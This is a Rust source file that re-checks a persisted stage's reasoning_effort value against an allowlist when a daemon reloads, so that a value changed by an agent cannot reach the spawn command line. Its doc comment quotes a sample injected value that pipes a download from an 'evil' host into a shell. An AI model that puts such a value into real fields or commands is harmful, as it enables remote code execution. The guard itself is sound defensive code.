//! Load-time guards on fields of a persisted `Stage`.

use serde::{Deserialize, Deserializer};

use super::types::ALLOWED_REASONING_EFFORTS;

/// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
/// hard error, but a persisted `Stage` is re-read from `.loom/work/stages/<id>.md` on
/// every daemon restart, and that file is writable by a worktree agent. Without
/// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
/// survive reload and be concatenated into the spawn command line.
/// Invalid persisted values are neutralized rather than bricking daemon reload.
pub(super) fn deserialize_persisted_reasoning_effort<'de, D>(
    deserializer: D,
) -> Result<Option<String>, D::Error>
where
    D: Deserializer<'de>,
{
    let opt = <Option<String>>::deserialize(deserializer)?;
    match opt {
        None => Ok(None),
        Some(s) if ALLOWED_REASONING_EFFORTS.contains(&s.as_str()) => Ok(Some(s)),
        Some(invalid) => {
            tracing::error!(
                invalid_reasoning_effort = %invalid,
                allowed = %ALLOWED_REASONING_EFFORTS.join(", "),
                "Persisted stage reasoning_effort failed allowlist re-validation on load; \
                 dropping to None and falling back to the stage-type default"
            );
            Ok(None)
        }
    }
}
